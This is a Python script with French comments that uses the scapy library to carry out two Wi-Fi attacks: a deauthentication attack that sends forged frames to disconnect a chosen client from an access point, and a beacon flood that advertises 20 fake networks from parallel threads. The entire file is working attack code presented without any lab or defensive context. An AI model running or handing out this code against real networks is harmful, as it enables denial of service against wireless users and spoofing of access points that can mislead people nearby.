# -*- coding: utf-8 -*-

import random
import time
from threading import Thread
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt

def deauth_attack(interface, target, bssid, count):
    """
    Effectue une attaque de désauthentification contre un client cible.

    :param interface: L'interface réseau à utiliser.
    :param target: L'adresse MAC du client cible.
    :param bssid: Le BSSID du point d'accès.
    :param count: Le nombre de paquets à envoyer.
    """
    print(f"\n[!!!] ATTAQUE DE DÉSAUTHENTIFICATION [!!!]")
    print(f"    -> Cible      : {target}")
    print(f"    -> BSSID      : {bssid}")
    print(f"    -> Interface  : {interface}")
    
    # Crée un paquet de désauthentification
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    
    print(f"[*] Envoi de {count} paquets de désauthentification...")
    try:
        sendp(packet, iface=interface, count=count, inter=0.1, verbose=0)
        print("[+] Attaque terminée.")
    except Exception as e:
        print(f"[-] Une erreur est survenue pendant l'attaque : {e}")

def beacon_flood(interface, ssid_base):
    """
    Inonde la zone avec de fausses trames de balise provenant de points d'accès inexistants.

    :param interface: L'interface réseau à utiliser.
    :param ssid_base: Le nom de base pour les faux SSID.
    """
    print(f"\n[!!!] ATTAQUE BEACON FLOOD [!!!]")
    print("Cette attaque va générer une multitude de faux réseaux Wi-Fi.")
    print("Appuyez sur CTRL+C pour arrêter.")
    
    stop_thread = False

    def send_beacon(ssid, bssid):
        """Envoie une seule trame de balise."""
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        frame = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / beacon / essid
        
        while not stop_thread:
            try:
                sendp(frame, iface=interface, inter=0.1, verbose=0)
            except Exception:
                # L'interface peut tomber, donc on arrête simplement le thread
                break

    threads = []
    try:
        for i in range(20):  # Crée 20 faux réseaux
            ssid = f"{ssid_base}_{i}"
            # Génère un BSSID aléatoire
            bssid = f"00:11:22:33:44:{i:02x}"
            thread = Thread(target=send_beacon, args=(ssid, bssid))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Arrêt de l'inondation de balises...")
        stop_thread = True
        # Il n'est pas nécessaire de joindre les threads démons
        print("[+] Attaque terminée.")
